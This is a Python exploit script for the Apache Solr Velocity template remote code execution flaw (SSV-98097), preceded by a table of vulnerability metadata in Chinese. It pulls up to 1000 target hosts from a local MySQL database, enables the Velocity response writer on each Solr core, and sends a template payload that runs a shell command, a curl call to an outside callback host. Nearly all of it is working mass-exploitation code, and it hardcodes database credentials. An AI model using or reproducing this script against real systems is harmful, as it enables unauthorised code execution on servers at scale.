#! /usr/bin/python3


#persistence of energy  能量守恒v1.1

import pymysql,uuid,requests,re,demjson
import argparse,threading,time
from tabulate import tabulate
   
def pocinfo():
    #基本信息
    idea = '能量守恒'
    loopholename = 'apache-solr-velocity-rce' 
    loopholenumber = 'SSV-98097'  
    loopholetype = 'RCE' 
    middleware = 'solr' 
    defaultport ='8093' 
    loopholecomponent = 'velocity模板' 
    loopholefeatures = 'x' 
    softwareversion = '<8.2.0'
    pocurl = 'x' 
    expurl = 'x' 
    loopholedemourl ='x'
    foakeyword = 'solr' 
    zoomeyekeyword = 'solr'
    shodankeyword ='solr' 
    patchurl ='x' 
    bigdataassets ='x' 
    loopholeopentime ='2019-10-31'
    timeone ='2019-10-31'
    #漏洞描述评价
    loopholetracking ='高危' 
    networkenvironment ='外网/内网' 
    attackvector ='Http' 
    loopholepocopen='公开' 
    loopholedetails ='公开' 
    cvss3 = 'x' 
    collector ='Greekn' 
    email= 'x' 
    time_modu = '2019-11-3' 

    poe_info = [['idea',idea,],['漏洞名称',loopholename],['漏洞编号',loopholenumber],['漏洞类型',loopholetype],['中间件',middleware],['默认开放端口',defaultport],['漏洞组件',loopholecomponent],
                ['漏洞特征',loopholefeatures],['受影响的版本号',softwareversion],['漏洞验证脚本网址',pocurl],['漏洞利用脚本网址',expurl],['漏洞复现网址',loopholedemourl],['fofa资产搜索关键词',foakeyword],
                ['钟馗之眼资产搜索关键词',zoomeyekeyword],['shodan资产搜索关键词',shodankeyword],['补丁网址',patchurl],['大数据资产统计new',bigdataassets],['漏洞创建时间',loopholeopentime],['漏洞收集时间',timeone],
                ['漏洞追踪笔记',loopholetracking],['网络环境new',networkenvironment],['攻击向量',attackvector],['漏洞验证脚本是否公开',loopholepocopen],['漏洞细节是否公开',loopholedetails],['漏洞评分',cvss3],['模块作者',collector],['模块作者邮箱',email],['模块编写时间',time_modu]
                ]
    display = ['basic_info', 'text_data']
    print(tabulate(poe_info, headers=display, tablefmt='grid'))
    return 0


def loadtarget(): #参数传递 poc程序    
    pocinfo()
    print('[*]加载漏洞基础信息......')
    uri = uuid.uuid1()
    chek_host = 'ydueru.ceye.io/' #触发地址
    #pattern = 'ping'+' '+ str(uri) + '.'+chek_host #target内置软件 ping 
    pattern = 'curl%20' +chek_host+str(uri) #target 内置软件 curl 
    try:
        mysql = pymysql.connect(
        host = "127.0.0.1",
        user = "root",password = "wxwxwx",
        database = "asset",
        charset = "utf8",
        )
        cursor = mysql.cursor()
        query = 'SELECT count(*) FROM target; '
        set  = cursor.execute(query)
        setvalue = cursor.fetchall()
        sql ='SELECT * FROM `asset`.`target` LIMIT 0,1000'
        conout = cursor.execute(sql)
        result = cursor.fetchall() 
        try:
            for i in range(setvalue[0][0]):
                try:
                    target = 'http://'+result[i][0]+'/'
                    headers = {  
                    'Accept': 'application/json, text/plain, */*',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36',
                    'Accept-Encoding': 'gzip, deflate',
                    }
                    
                    nodepath = 'solr/admin/cores?wt=json&indexInfo=false'
                    node = requests.get(target+nodepath,headers=headers,timeout=20)
                    nodecode = demjson.decode(node.text)
                    name = list(nodecode['status'])
                    data = '''
                    {
                          "update-queryresponsewriter": {
                            "startup": "lazy",
                            "name": "velocity",
                            "class": "solr.VelocityResponseWriter",
                            "template.base.dir": "",
                            "solr.resource.loader.enabled": "true",
                            "params.resource.loader.enabled": "true"
                          }
                        }
                    
                    '''
                    
                    postpath = '/solr/'+name[0]+'/config'
                    
                    putdata = requests.post(target,data=data,headers=headers,timeout=20)
                    
                    payload = 'solr/'+ name[0] +'/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27'+pattern+'%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
                    
                    dataput = requests.get(target+payload,timeout=20)
                    
                    print('[+]'+'['+str(i)+']'+'数据发送成功' + target)                    
                       
                except:
                    print('[-]'+'['+str(i)+']'+'目标访问失败！'+ target)                    
                            
        except:
            print('[-]获取数据失败！','\n')


    except:  
        
        print('[-]连接失败！','\n')

       
if __name__=='__main__':
     start_run = threading.Thread(target=loadtarget)
     start_run.start()
    